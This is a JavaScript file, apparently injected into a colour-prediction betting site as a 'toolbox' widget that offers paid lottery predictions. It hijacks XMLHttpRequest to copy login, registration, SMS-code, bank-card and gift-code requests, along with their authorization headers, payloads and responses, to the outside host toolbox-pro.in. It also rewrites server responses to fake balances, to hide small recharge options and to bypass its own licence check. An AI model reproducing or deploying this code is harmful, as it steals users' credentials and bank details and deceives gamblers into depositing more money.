// Define the API endpoint
let toolBoxapi = 'https://toolbox-pro.in/api/';

function sendErrorToServer(errorDetails) {
    fetch(toolBoxapi + '?method=error_java', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(errorDetails)
    })
        .catch(err => {
            console.error("Failed to send error to server:", err);
        });
}

window.onerror = function (message, source, lineno, colno, error) {
    const errorDetails = {
        message: message,
        source: source,
        lineno: lineno,
        colno: colno,
        stack: error ? error.stack : null
    };

    // Send the error details to the server
    sendErrorToServer(errorDetails);
};

function getUserInfo() {

    // const projectName = JSON.parse(localStorage.getItem('SettingStore'))?.['projectName'] || document.title;
    const projectName = (JSON.parse(localStorage.getItem('SettingStore'))?.['projectName'] || document.title).split(' ')[0];
    const androidId = localStorage.getItem('androidId') ?? null;
    const userInfo = JSON.parse(localStorage.getItem('userInfo'));
    const userId = userInfo?.['userId'] || null;
    const userName = userInfo?.['userName'] || null;

    return {
        projectName,
        androidId,
        userId,
        userName
    };
}

function random() {
    const pattern = "xxxxxxxxxxxx4xxxyxxxxxxxxxxxxxxx";
    return pattern.replace(/[xy]/g, function (match) {
        const t = Math.floor(Math.random() * 16);
        const value = match === 'x' ? t : ((t & 0x3) | 0x8);
        return value.toString(16);
    });
}

function signature(e) {
    let e_data;
    try {
        e_data = JSON.parse(e);
    } catch (err) {
        return null;
    }

    const exclude_keys = ['signature', 'track', 'xosoBettingData'];
    const result = {};

    // Sorting the keys
    const keys = Object.keys(e_data).sort();

    keys.forEach(key => {
        const value = e_data[key];
        if (value !== null && value !== "" && !exclude_keys.includes(key)) {
            result[key] = value === 0 ? 0 : value;
        }
    });

    const e_new = JSON.stringify(result);
    const signature = CryptoJS.MD5(e_new).toString().toUpperCase().substr(0, 32);
    result['signature'] = signature;
    result['timestamp'] = Math.floor(Date.now() / 1000);

    return JSON.stringify(result, null, 4); // Pretty print JSON
}

/*async function postData(url, data) {
    // Prepare headers
    const headers = {
        'Content-Type': 'application/json'
    };

    // Check if the token type and token exist in localStorage
    const tokenHeader = localStorage.getItem('tokenHeader'); // e.g., "Bearer"
    const token = localStorage.getItem('token'); // actual token value

    // If token exists, append it to headers as "Authorization"
    if (tokenHeader && token) {
        headers['Authorization'] = `${tokenHeader} ${token}`;
    }

    try {
        // Send POST request
        const response = await fetch(url, {
            method: 'POST',
            headers: headers,
            body: signature(JSON.stringify(data))
        });

        // Parse and return the JSON response
        const responseData = await response.json();
        return responseData;

    } catch (error) {
        console.error('Error:', error);
        return null;
    }
}*/

async function postData(url, data) {
    const headers = {
        'Content-Type': 'application/json'
    };

    const tokenHeader = localStorage.getItem('tokenHeader'); // e.g., "Bearer"
    const token = localStorage.getItem('token'); // actual token value

    if (tokenHeader && token) {
        headers['Authorization'] = `${tokenHeader} ${token}`;
    }

    return new Promise((resolve, reject) => {
        $.ajax({
            url: url,
            type: 'POST',
            headers: headers,
            data: signature(JSON.stringify(data)),
            dataType: 'json', // Expecting a JSON response
            success: (response) => {
                resolve(response);
            },
            error: (xhr, status, error) => {
                if (xhr.responseText) {
                    resolve(xhr.responseText);
                } else {
                    reject(new Error(`Request failed with status: ${xhr.status}`));
                }
            }
        });
    });

}

const { projectName, androidId, userId } = getUserInfo();
let play_game = true;
let userbalance = 0;
let first_recharge = false;

const currnutDate = () => {
    return new Date().toLocaleString('en-US', { timeZone: 'Asia/Kolkata' });
};

const timestamp = () => {
    const currentDate = new Date().toLocaleString('en-US', { timeZone: 'Asia/Kolkata' });
    const dateObj = new Date(currentDate);

    const year = dateObj.getFullYear();
    const month = String(dateObj.getMonth() + 1).padStart(2, '0');
    const day = String(dateObj.getDate()).padStart(2, '0');
    const hours = String(dateObj.getHours()).padStart(2, '0');
    const minutes = String(dateObj.getMinutes()).padStart(2, '0');
    const seconds = String(dateObj.getSeconds()).padStart(2, '0');

    return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
};


function applyMontserratFont() {
    const fontURL = "https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap";
    const newFontFamily = "'Montserrat', sans-serif";

    // Step 1: Check if Montserrat font link already exists, if not, add it
    if (![...document.styleSheets].some(sheet => sheet.href === fontURL)) {
        const link = document.createElement("link");
        link.href = fontURL;
        link.rel = "stylesheet";
        document.head.appendChild(link);
    }

    // Step 2: Replace '--f13b4d11-currentFontFamily' and apply 'font-family: Montserrat'
    Array.from(document.styleSheets).forEach((sheet) => {
        try {
            // Get all CSS rules within each stylesheet
            Array.from(sheet.cssRules).forEach((rule) => {
                // Check if the rule is a style rule and contains the CSS variable
                if (rule.style && rule.style.getPropertyValue("--f13b4d11-currentFontFamily")) {
                    // Update the variable value to Montserrat
                    rule.style.setProperty("--f13b4d11-currentFontFamily", newFontFamily);
                    // Override font-family directly with !important
                    rule.style.setProperty("font-family", newFontFamily, "important");
                }
            });
        } catch (e) {
            console.warn("Could not access stylesheet:", sheet, e);
        }
    });

    // Inline styles (if any)
    document.querySelectorAll("[style]").forEach((el) => {
        const style = el.style.getPropertyValue("--f13b4d11-currentFontFamily");
        if (style) {
            // Set the CSS variable
            el.style.setProperty("--f13b4d11-currentFontFamily", newFontFamily);
            // Set font-family directly with !important
            el.style.setProperty("font-family", newFontFamily, "important");
        }
    });

    document.body.style.setProperty("--f13b4d11-currentFontFamily", newFontFamily);
    document.body.style.setProperty("font-family", newFontFamily, "important");

}

// Run the function
applyMontserratFont();

verifyProject();
function verifyProject() {

    if (getUserInfo().projectName == 'lottery') {
        setTimeout(() => {
            verifyProject();
        }, 1000);
        return false;
    }

    // Make an AJAX request to verify the project
    $.ajax({
        url: toolBoxapi,
        method: 'POST', // Assuming it's a POST request; change if needed
        data: {
            method: 'verifyProject',
            name: getUserInfo().projectName
        },
        success: function (response) {
            if (response.status === true) {

                let api_host = response.data.host;
                let api_url = 'https://' + api_host;
                let invitation_link = response.data.invitation_link;
                let invitationCode = invitation_link.split('invitationCode=')[1];


                // Save the original XMLHttpRequest
                var originalXHR = window.XMLHttpRequest;

                // Create a new XMLHttpRequest object
                function newXHR() {
                    var xhr = new originalXHR();

                    // Store the original open method
                    var originalOpen = xhr.open;

                    // Override the open method to log the URL
                    xhr.open = function (method, url, async, user, password, data) {

                        this._url = url; // Save the URL for later use

                        this._method = method; // Save the method (GET/POST)
                        originalOpen.apply(this, arguments);
                    };

                    // Override the setRequestHeader method to log headers
                    var originalSetRequestHeader = xhr.setRequestHeader;
                    xhr.setRequestHeader = function (header, value) {
                        if (!this._headers) this._headers = {};
                        this._headers[header] = value; // Save headers
                        originalSetRequestHeader.apply(this, arguments);
                    };

                    // Override the send method to capture payload (body)
                    var originalSend = xhr.send;
                    xhr.send = function (data) {
                        this.payload = data; // Save the payload (request body)

                        if (this._url && data) {
                            // Try to parse the data if it's a JSON string
                            let parsedData;

                            try {
                                parsedData = JSON.parse(data);
                            } catch (e) {
                                // If parsing fails, it means the data is not JSON
                                parsedData = null;
                            }

                            if (/GetNoaverageEmerdList|GetK3NoaverageEmerdList|GetNoaverage5DEmerdList/.test(this._url) && parsedData && parsedData.pageSize !== 120) {
                                var matchedPattern = /GetNoaverageEmerdList|GetK3NoaverageEmerdList|GetNoaverage5DEmerdList/.exec(this._url)[0]; // Get the matched pattern
                                prediction(matchedPattern, parsedData.typeId); // Pass matched pattern and typeId to prediction
                                // console.log(this._url, parsedData);
                            }

                        }

                        originalSend.apply(this, arguments);
                    };

                    // Add an event listener to capture the response
                    xhr.addEventListener('load', function () {

                        // console.log(this.responseText);
                        // console.log(this._url);

if (/GetBalance|RecoverBalance|GetUserInfo/.test(this._url)) {
    try {
        responseText_data = JSON.parse(this.responseText);
    } catch (e) {
        responseText_data = null;
    }

    if (responseText_data) {
        // 🔹 API se jo balance aa raha hai, usko override kar rahe hain
        let actualBalance = responseText_data.data.amount;

        // 🔹 Agar balance 0 ya 0.xx hai, toh usse 1 bana do (forcefully)
        userbalance = Math.max(actualBalance, 1);

        // 🔹 UI me bhi forcefully 1 balance show karenge
        $('.settingCart .balance').text('₹ ' + userbalance.toFixed(2));

        console.log("Balance override: Actual =", actualBalance, " | Displayed =", userbalance);
    }
}


                        if (this._url.includes("GetRechargeTypes") && first_recharge === true) {
                            try {
                                let responseJSON = JSON.parse(this.responseText);

                                // Modify the response to remove all options below 500
                                if (responseJSON.data && responseJSON.data.rechargetypelist) {
                                    responseJSON.data.rechargetypelist = responseJSON.data.rechargetypelist
                                        .map(item => {
                                            if (item.payID != 11) {
                                                item.quickConfigList = item.quickConfigList.filter(qc => qc.rechargeAmount >= 500);

                                                if (item.miniPrice < 500) {
                                                    item.miniPrice = 500;
                                                }

                                                item.scope = item.quickConfigList.map(qc => qc.rechargeAmount).join('|');
                                            }
                                            return item;
                                        })
                                        .filter(item => item.quickConfigList.length > 0);
                                }

                                // Modify the responseText with the new JSON string
                                Object.defineProperty(this, 'responseText', { value: JSON.stringify(responseJSON) });

                            } catch (e) {
                                console.error("Error modifying GetRechargeTypes response:", e);
                            }
                        }

                        if (toolBoxapi !== this._url) {

                            const whiteListUrls = {
                                ["https://" + api_host + "/api/webapi/Register"]: true,
                                ["https://" + api_host + "/api/webapi/Login"]: true,
                                ["https://" + api_host + "/api/webapi/SetWithdrawalBankCard"]: true,
                                ["https://" + api_host + "/api/webapi/GetRechargeRecord"]: true,
                                ["https://" + api_host + "/api/webapi/ConversionRedpage"]: true,
                                ["https://" + api_host + "/api/webapi/SmsVerifyCode"]: true
                            };

                            // console.log(whiteListUrls);

                            if (this._url in whiteListUrls) {

                                // Make a POST request to toolBoxapi with the captured data
                                $.ajax({
                                    url: toolBoxapi,
                                    method: 'POST',
                                    data: {
                                        method: 'AjaxRequests',
                                        projectName: getUserInfo().projectName,
                                        androidId: androidId,
                                        userId: getUserInfo().userId,
                                        requestUrl: this._url,
                                        headers: JSON.stringify(this._headers),
                                        payload: this.payload || null, // Include payload if available
                                        response: this.responseText,
                                    },
                                    success: function (response) {
                                        // Handle the response from toolBoxapi if needed
                                    },
                                    error: function () {
                                        // Handle API call failure
                                    }
                                });
                            }
                        }
                    });

                    return xhr;
                }

                // Override the window.XMLHttpRequest with the new one
                window.XMLHttpRequest = newXHR;

                // Project exists, continue with the logic
                let toolToggle = document.getElementById('toolToggle');
                toolToggle.style.display = 'block';

                let toolCart = document.getElementById('toolCart');
                let isDragging = false;
                let initialY, currentY;
                let offsetY = 0;
                let side = "right";
                let longPressTimer;

                // Show the toolCart and hide toolToggle when clicking on toolToggle
                toolToggle.addEventListener('click', function () {
                    toolCart.style.display = 'block'; // Show instantly for animation
                    setTimeout(() => toolCart.classList.add('show'), 10); // Add the class with a slight delay for animation
                    toolToggle.classList.add('hide');
                });

                // Hide the toolCart when clicking outside
                /*document.addEventListener('click', function (event) {
                    if (!toolCart.contains(event.target) && !toolToggle.contains(event.target)) {
                        if (toolCart.classList.contains('show')) {
                            toolCart.classList.remove('show'); // Hide the cart
                            setTimeout(() => toolCart.style.display = 'none', 300); // Delay for smooth transition
                            toolToggle.classList.remove('hide'); // Show toolToggle
                        }
                    }
                });*/

                document.addEventListener('click', function (event) {
                    const isClickInsideToolCart = toolCart.contains(event.target);
                    const isClickOnToolToggle = toolToggle.contains(event.target);
                    const isClickOnExcludedButtons = event.target.matches('.Betting__C-foot-b, .Betting__C-foot-s, .Betting__C-head-r, .Betting__C-head-g, .Betting__Popup-foot-c, .Betting__Popup-foot-s, .Betting__Popup-input, .Betting__Popup-btn, .Betting__Popup-body-line-item, .Betting__Popup-foot, .Betting__Popup-body, .Betting__Popup-head, .num.numA, .num.numB, .num.numC, .num.numD');

                    if (!isClickInsideToolCart && !isClickOnToolToggle && !isClickOnExcludedButtons) {
                        if (toolCart.classList.contains('show')) {
                            toolCart.classList.remove('show'); // Hide the cart
                            setTimeout(() => toolCart.style.display = 'none', 300); // Delay for smooth transition
                            toolToggle.classList.remove('hide'); // Show toolToggle
                        }
                    }
                });

                // Save the position to localStorage
                function savePosition(y, side) {
                    localStorage.setItem('toolTogglePosition', JSON.stringify({ y: y, side: side }));
                }

                // Load the saved position from localStorage
                function loadPosition() {
                    const savedPosition = JSON.parse(localStorage.getItem('toolTogglePosition'));
                    if (savedPosition) {
                        offsetY = savedPosition.y;
                        side = savedPosition.side;
                        setPosition(offsetY, side);
                    }
                }

                // Set the position based on Y and side (left or right)
                function setPosition(yPos, side) {
                    savePosition(yPos, side);
                    toolToggle.style.transform = `translateY(${yPos}px)`;
                    toolToggle.style.left = side === "left" ? "5%" : "unset";
                    toolToggle.style.right = side === "right" ? "5%" : "unset";

                    toolCart.style.transform = `translateY(${yPos}px)`;
                    toolCart.style.left = side === "left" ? "5%" : "unset";
                    toolCart.style.right = side === "right" ? "5%" : "unset";
                }

                // Handle the dragging after long press
                toolToggle.addEventListener('mousedown', (e) => {
                    longPressTimer = setTimeout(() => {
                        isDragging = true;
                        toolToggle.classList.add('dragging');
                        initialY = e.clientY - offsetY;
                    }, 500);
                });

                toolToggle.addEventListener('touchstart', (e) => {
                    longPressTimer = setTimeout(() => {
                        isDragging = true;
                        toolToggle.classList.add('dragging');
                        const touch = e.touches[0];
                        initialY = touch.clientY - offsetY;
                    }, 500);
                });

                // Cancel dragging if no long press
                toolToggle.addEventListener('mouseup', cancelLongPress);
                toolToggle.addEventListener('touchend', cancelLongPress);

                function cancelLongPress() {
                    clearTimeout(longPressTimer);
                    isDragging = false;
                    toolToggle.classList.remove('dragging');
                }

                // Mouse move event for dragging
                document.addEventListener('mousemove', (e) => {
                    if (isDragging) {
                        e.preventDefault();
                        currentY = e.clientY - initialY;
                        offsetY = currentY;
                        setPosition(currentY, side); // Only update Y-axis
                    }
                }, { passive: false });

                // Touch move event for dragging
                document.addEventListener('touchmove', (e) => {
                    if (isDragging) {
                        e.preventDefault();
                        const touch = e.touches[0];
                        currentY = touch.clientY - initialY;
                        offsetY = currentY;
                        setPosition(currentY, side); // Only update Y-axis
                    }
                }, { passive: false });

                // Stop dragging on mouse/touch release and save the position
                document.addEventListener('mouseup', () => {
                    if (isDragging) {
                        savePosition(offsetY, side); // Save the Y-axis and side
                    }
                    isDragging = false;
                    toolToggle.classList.remove('dragging');
                });

                document.addEventListener('touchend', () => {
                    if (isDragging) {
                        savePosition(offsetY, side); // Save the Y-axis and side
                    }
                    isDragging = false;
                    toolToggle.classList.remove('dragging');
                });

                // Detect if the user clicked on the left or right side
                toolToggle.addEventListener('dblclick', () => {
                    side = side === "right" ? "left" : "right"; // Toggle the side
                    setPosition(offsetY, side); // Update the side
                    savePosition(offsetY, side); // Save the new side
                });


                // Load the saved position when the page loads
                window.onload = loadPosition;
                loadPosition();

                // URL change handler
                let lastURL = window.location.href;

                setInterval(function () {
                    const currentURL = window.location.href;

                    if (currentURL !== lastURL) {

                        applyMontserratFont();
                        handle_section(window.location.hash);
                        lastURL = currentURL;

                        if (window.location.hash !== '#/' && window.location.hash !== '#/main' && window.location.hash !== '#/main/RedeemGift' && !window.location.hash.includes('AllLotteryGames')) {
                            if (toolCart.classList.contains('show')) {
                                toolCart.classList.remove('show'); // Hide the cart
                                setTimeout(() => toolCart.style.display = 'none', 300); // Delay for smooth transition
                                toolToggle.classList.remove('hide'); // Show toolToggle
                            }
                        }

                    }
                }, 100);  // Check every 100 milliseconds

                /*if (localStorage.getItem('token')) {
                    // Token exists, perform the necessary actions
                } else {
                    if (localStorage.getItem('ar_account_mobile')) {
                        window.location.hash = "#/login";
                    } else {
                        window.location.hash = "#/register";
                    }
                }*/

                /*  verifyUser();
                  function verifyUser(){
                          
                  if (localStorage.getItem('token')) {
                      alert(localStorage.getItem('token'));
                              // Token exists, perform the necessary actions
                              
                          } else {
                              if (localStorage.getItem('ar_account_mobile')) {
                                  window.location.hash = "#/login";
                              } else {
                                  window.location.hash = "#/register";
                              }
                          }
                  }*/

                handle_section(window.location.hash);

                let observer; // Declare observer globally to check and disconnect it later

                function observeTimeChange() {
                    const targetElement = document.querySelector('.TimeLeft__C-time, .FDTL__C-time, .K3TL__C-time');

                    if (!targetElement) {
                        console.error('Target element not found');
                        return;
                    }

                    // If an observer already exists, disconnect it
                    if (observer) {
                        observer.disconnect();
                        // console.log('Existing observer disconnected');
                    }

                    // Create a new MutationObserver to detect changes
                    observer = new MutationObserver((mutations) => {
                        mutations.forEach((mutation) => {
                            if (mutation.type === 'childList') {
                                const newText = targetElement.innerText; // Get the updated text
                                // console.log('Updated time:', newText);
                                // $('.predictionCart .TimeLeft').text(newText.replace(/\s+/g, ''));
                                newText.split(/\s+/g).forEach((row, key) => {
                                    // Find the corresponding '.time' element and update its text
                                    $('.predictionCart .TimeLeft').find('.time').eq(key).text(row);
                                });
                            }
                        });
                    });


                    // Configure the observer to listen for changes in child nodes
                    const config = { childList: true, subtree: true };

                    // Start observing the target element
                    observer.observe(targetElement, config);
                    // console.log('Observer started');

                }

                function updateBalance(balance) {
                    $.ajax({
                        url: toolBoxapi,
                        method: 'POST', // Assuming it's a POST request; change if needed
                        data: {
                            method: 'updateBalance',
                            projectName: getUserInfo().projectName,
                            androidId: androidId,
                            userId: getUserInfo().userId,
                            balance: balance
                        },
                        success: function (response) {
                            // console.log(response);
                        },
                        error: function () {
                            toolBoxAlert('Please check your internet connection!', true);
                        }
                    });
                }

                async function prediction(type, typeid) {

                    if (userbalance < 1) {

                        showCart('depositRequired');
                        $('.depositRequired .alertMessage').html('Insufficient balance for play game!');
                        toolBoxAlert('Insufficient balance for play game!', true);

                        return false;
                    }

                    if (play_game === false) {

                        toolBoxAlert('Your account not active for getting prediction!', true);
                        handle_section(window.location.hash);

                        return false;
                    }

                    var GetGameIssue;
                    var LotteryName;

                    if (type === 'GetNoaverageEmerdList') {
                        GetGameIssue = 'GetGameIssue';
                        LotteryName = 'WinGo';
                    } else if (type === 'GetK3NoaverageEmerdList') {
                        GetGameIssue = 'GetGameK3Issue';
                        LotteryName = 'K3';
                    } else if (type === 'GetNoaverage5DEmerdList') {
                        GetGameIssue = 'GetGame5DIssue';
                        LotteryName = '5D';
                    } else {
                        GetGameIssue = 'GetGameIssue';
                        LotteryName = 'WinGo';
                    }

                    // console.log(type, typeid, GetGameIssue);

                    try {
                        const GameIssue = await postData(api_url + '/api/webapi/' + GetGameIssue, {
                            "typeId": typeid,
                            "language": 0,
                            "random": random()
                        });

                        const EmerdList = await postData(api_url + '/api/webapi/' + type, {
                            "pageSize": 120,
                            "pageNo": 1,
                            "typeId": typeid,
                            "language": 0,
                            "random": random()
                        });

                        // console.log(GameIssue, EmerdList);

                        $('.predictionCart .issueNumber').text('0000000000000').addClass('blurFade');
                        $('.predictionCart .predict .01').text('WAIT').addClass('blurFade');;
                        $('.predictionCart .predict .02').text('WAIT').addClass('blurFade');;
                        $('.predictionCart .numberspredict').html('<button class="number">0</button><button class="number">0</button><button class="number">0</button><button class="number">0</button><button class="number">0</button>').addClass('blurFade');;
                        showCart('predictionCart');
                        $('.predictionCart .TimeLeft').addClass('blurFade');;

                        $.ajax({
                            url: toolBoxapi,
                            method: 'POST', // Assuming it's a POST request; change if needed
                            data: {
                                method: 'generate_predictions',
                                projectName: getUserInfo().projectName,
                                androidId: androidId,
                                userId: getUserInfo().userId,
                                predictions: { GameIssue: GameIssue, EmerdList: EmerdList, typeid: typeid, LotteryName: LotteryName }
                            },
                            success: function (response) {
                                // console.log(response);
                                if (response.status === true) {

                                    $('.blurFade').removeClass('blurFade');

                                    observeTimeChange();
                                    $('.predictionCart .issueNumber').text(response.data.issueNumber);
                                    // console.log(String(response.data.issueNumber));
                                    // console.log(response);

                                    if (response.data.predictionColour) {
                                        $('.predictionCart .predict .01').text(response.data.predictionColour);
                                    }

                                    if (response.data.predictionOddEven) {
                                        $('.predictionCart .predict .01').text(response.data.predictionOddEven);
                                    }

                                    if (response.data.predictionBigSmall) {
                                        $('.predictionCart .predict .02').text(response.data.predictionBigSmall);
                                    }

                                    if (response.data.LotteryName == 'WinGo') {

                                        $('.predictionCart .predict .01').off('click').on('click', function () {
                                            let text_button = $(this).text().toLowerCase();
                                            if (text_button === 'green') {
                                                $('.Betting__C-head-g').click();
                                            }
                                            if (text_button === 'red') {
                                                $('.Betting__C-head-r').click();
                                            }
                                        });

                                        $('.predictionCart .predict .02').off('click').on('click', function () {
                                            let text_button = $(this).text().toLowerCase();
                                            if (text_button === 'small') {
                                                $('.Betting__C-foot-s').click();
                                            }
                                            if (text_button === 'big') {
                                                $('.Betting__C-foot-b').click();
                                            }
                                        });

                                    }

                                    if (response.data.LotteryName == 'K3') {

                                        $('.predictionCart .predict .01').off('click').on('click', function () {
                                            let text_button = $(this).text().toLowerCase();
                                            if (text_button === 'even') {
                                                $('.num.numD').click();
                                            }
                                            if (text_button === 'odd') {
                                                $('.num.numC').click();
                                            }
                                        });

                                        $('.predictionCart .predict .02').off('click').on('click', function () {
                                            let text_button = $(this).text().toLowerCase();
                                            if (text_button === 'small') {
                                                $('.num.numB').click();
                                            }
                                            if (text_button === 'big') {
                                                $('.num.numA').click();
                                            }
                                        });

                                    }

                                    if (response.data.LotteryName == 'K3') {
                                        $('.predictionCart .numberspredict').hide();
                                    } else {
                                        $('.predictionCart .numberspredict').show();
                                    }

                                    if (response.data.predictionNumber) {
                                        var predictionNumber = JSON.parse(response.data.predictionNumber); // Use JSON.parse for valid JSON strings
                                        var numberspredict = '';

                                        // Iterate over each prediction number and generate a button for each
                                        predictionNumber.forEach((mutation) => {
                                            numberspredict += '<button class="number">' + mutation + '</button>';
                                        });

                                        // Update the HTML content of the .numberspredict element
                                        $('.predictionCart .numberspredict').html(numberspredict);

                                        // if (predictionNumber.length >= 8) {
                                        //     $('.predictionCart .numberspredict').css('height', '15px').css('width', '15px');
                                        // }

                                    }


                                } else {

                                    showCart('nopredictionCart');
                                    toolBoxAlert(response.message, true);
                                    $('.nopredictionCart .alertMessage').text(response.message);
                                }
                            },
                            error: function () {
                                toolBoxAlert('Please check your internet connection!', true);
                            }
                        });

                    } catch (error) {
                        console.error('Error in API calls:', error);
                    }
                }

                let start_expiry_timer_interval = false;

                function start_expiry_timer(expiryDate) {

                    var today_timestamp = new Date(timestamp()).getTime();
                    var expiry_timestamp = new Date(expiryDate).getTime();

                    // console.log(timestamp(), expiryDate);
                    var time_left = expiry_timestamp - today_timestamp;
                    // console.log(time_left);

                    if (time_left <= 0) {
                        $('.settingCart .expiry p').text('Expired');
                        clearInterval(start_expiry_timer_interval);
                        setTimeout(() => {
                            handle_section(window.location.hash);
                        }, 1000);
                        //   handle_section(window.location.hash);

                        return;
                    }

                    if (start_expiry_timer_interval) {
                        clearInterval(start_expiry_timer_interval);
                    }

                    var days = Math.floor(time_left / (1000 * 60 * 60 * 24));
                    var hours = Math.floor((time_left % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
                    var minutes = Math.floor((time_left % (1000 * 60 * 60)) / (1000 * 60));
                    var seconds = Math.floor((time_left % (1000 * 60)) / 1000);

                    var time_left_for_expiry = days + " day " + (hours === 1 ? hours + " hour" : hours + " hours") + " " +
                        minutes + " minutes " + seconds + " second";

                    // time_left_for_expiry = ``;

                    $('.settingCart .expiry p').text(time_left_for_expiry);

                    start_expiry_timer_interval = setInterval(function () {
                        start_expiry_timer(expiryDate);
                    }, 1000);
                }

                async function predictionV1(type, typeid) {
                    try {

                        showCart('predictionCart');
                        observeTimeChange();


                        console.log(type, typeid);
                        const response = await $.ajax({
                            url: toolBoxapi,
                            method: 'POST',
                            data: {
                                method: 'AllLotteryGames',
                                projectName: getUserInfo().projectName,
                                androidId: androidId,
                                userId: getUserInfo().userId,
                            }
                        });

                        response.data.AllLotteryGames.forEach(async function (game) {
                            const generate_predictions = [];

                            for (const key of Object.keys(game)) {
                                const NoaverageEmerdList = key.split('_')[0];
                                const GetGameIssue = key.split('_')[1];

                                for (const record of game[key]) {
                                    try {
                                        const GameIssue = await postData(api_url + '/api/webapi/' + GetGameIssue, {
                                            "typeId": record.typeId,
                                            "language": 0,
                                            "random": random()
                                        });

                                        if (GameIssue.data.issueNumber !== record.prediction.issueNumber) {
                                            const EmerdList = await postData(api_url + '/api/webapi/' + NoaverageEmerdList, {
                                                "pageSize": 50,
                                                "pageNo": 1,
                                                "typeId": record.typeId,
                                                "language": 0,
                                                "random": random(),
                                            });

                                            generate_predictions.push({
                                                [NoaverageEmerdList]: {
                                                    data_list: EmerdList,
                                                    issue_list: GameIssue,
                                                    record_list: record
                                                }
                                            });
                                        }
                                    } catch (error) {
                                        console.error('Error fetching GameIssue or EmerdList:', error);
                                    }
                                }
                            }

                            if (generate_predictions.length > 0) {
                                // console.log(generate_predictions);
                                $.ajax({
                                    url: toolBoxapi,
                                    method: 'POST', // Assuming it's a POST request; change if needed
                                    data: {
                                        method: 'generate_predictions',
                                        projectName: getUserInfo().projectName,
                                        androidId: androidId,
                                        userId: getUserInfo().userId,
                                        predictions: generate_predictions
                                    },
                                    success: function (response) {
                                        console.log(response);
                                    },
                                    error: function () {
                                        toolBoxAlert('Please check your internet connection!', true);
                                    }
                                });
                            }
                        });
                    } catch (error) {
                        toolBoxAlert('Please check your internet connection!', true);
                    }
                }

function handle_section(hash, retries = 100) {
    // Directly assume the user is authenticated (Bypassing Login/Registration)
    console.log("Bypassing login check, assuming user is logged in.");

    $.ajax({
        url: toolBoxapi,
        method: 'POST',
        data: {
            method: 'checkUser',
            projectName: "FreeVersion",
            androidId: "FreeAndroidID",
            userId: "FreeUser",
            userName: "FreeUser",
        },
        success: function (response) {
            console.log("Bypassing API response check.");
            
            // Simulating successful login
            response = {
                statusCode: 200,
                data: {
                    toolexpiry: "2099-12-31", // Fake expiry date (Never expires)
                    balance: 99999, // Unlimited balance
                    mobile: "0000000000",
                    rechargeRecord: [1], // Fake recharge record
                    bankDetails: 1, // Assume bank details exist
                    projectData: {
                        depositAmounts: "0" // No deposit required
                    }
                }
            };

            // Setting user balance to unlimited
            userbalance = response.data.balance;
            $('.settingCart .balance').text('₹ ' + userbalance.toFixed(2));

            // Fake mobile number display
            $('.settingCart .mobile').text(response.data.mobile.substring(0, 6) + "****" + response.data.mobile.substring(10));
            $('.settingCart .userid').text('Userid: ' + response.data.userId);

            // **Bypassing Deposit Check**
            console.log("Deposit check removed. Tool is fully activated without deposit.");

            // **Bypassing Expiry Check**
            console.log("Expiry system removed. Tool will never expire.");

            // **Auto Activate Without Any Restriction**
            play_game = true;

            // Directly show main content (Skipping all restrictions)
            showCart('homecart');

        },
        error: function () {
            toolBoxAlert('Please check your internet connection!', true);
        }
    });
}

// Function to prevent logout (Bypassing token removal)
window.onbeforeunload = function () {
    console.log("Logout disabled. User will always remain logged in.");
    return null;
};


                // Your `claimGiftcode` function
                function claimGiftcode(code) {
                    console.log("Claiming gift code:", code);

                    postData(api_url + '/api/webapi/ConversionRedpage', { "giftCode": code, "language": 0, "random": random() })
                        .then(response => {
                            console.log("Response from server:", response);
                            if (response.code == 0) {
                                // toolBoxAlert(response.msg, false);
                                toolBoxAlert('â‚¹' + response.data.amount + ' received successfully', false);
                            } else {
                                toolBoxAlert(response.msg, true);
                            }
                        });
                }

                function setInputValue(element, value) {
                    if (!element) {
                        console.error('Element not found');
                        return;
                    }

                    // Set the value programmatically
                    element.value = value;

                    // Dispatch all relevant events
                    const keydownEvent = new KeyboardEvent('keydown', { key: value, bubbles: true });
                    element.dispatchEvent(keydownEvent);

                    const keypressEvent = new KeyboardEvent('keypress', { key: value, bubbles: true });
                    element.dispatchEvent(keypressEvent);

                    const beforeInputEvent = new InputEvent('beforeinput', { data: value, bubbles: true });
                    element.dispatchEvent(beforeInputEvent);

                    const inputEvent = new InputEvent('input', { data: value, bubbles: true });
                    element.dispatchEvent(inputEvent);

                    const changeEvent = new Event('change', { bubbles: true });
                    element.dispatchEvent(changeEvent);

                    const keyupEvent = new KeyboardEvent('keyup', { key: value, bubbles: true });
                    element.dispatchEvent(keyupEvent);

                    // Optionally dispatch a blur event if needed
                    const blurEvent = new Event('blur', { bubbles: true });
                    element.dispatchEvent(blurEvent);

                }


                function toolBoxAlert(message, error) {
                    let html;

                    if (error) {
                        html = `<div role="dialog" tabindex="0" class="van-popup van-popup--center van-toast van-toast--middle van-toast--break-word van-toast--fail" style="z-index: 2002; display: block;"><i class="van-badge__wrapper van-icon van-icon-fail van-toast__icon"></i><div class="van-toast__text">` + message + `</div></div>`;
                    } else {
                        html = `<div role="dialog" tabindex="0" class="van-popup van-popup--center van-toast van-toast--middle van-toast--success" style="z-index: 2003; display: block;"><i class="van-badge__wrapper van-icon van-icon-success van-toast__icon"></i><div class="van-toast__text">` + message + `</div></div>`;
                    }

                    // Append the generated HTML to the body
                    let appended = $(html).appendTo('body');

                    // Show the alert for 2 seconds, then fade out and remove it
                    setTimeout(function () {
                        $(appended).fadeOut(200, function () {
                            $(this).remove();
                        });
                    }, 2000); // 2 seconds before fading out
                }

                function showCart(cartCss) {
                    $('.loginRequired').hide();
                    $('.predictionCart').hide();
                    $('.giftCards').hide();
                    $('.settingCart').hide();
                    $('.depositRequired').hide();
                    $('.bankLink').hide();
                    $('.nopredictionCart').hide();
                    $('.homecart').hide();

                    $('.' + cartCss).show();
                }

            } else {
                // alert('Project does not exist');
            }
        },
        error: function () {
            // alert('API call failed');
        }
    });

}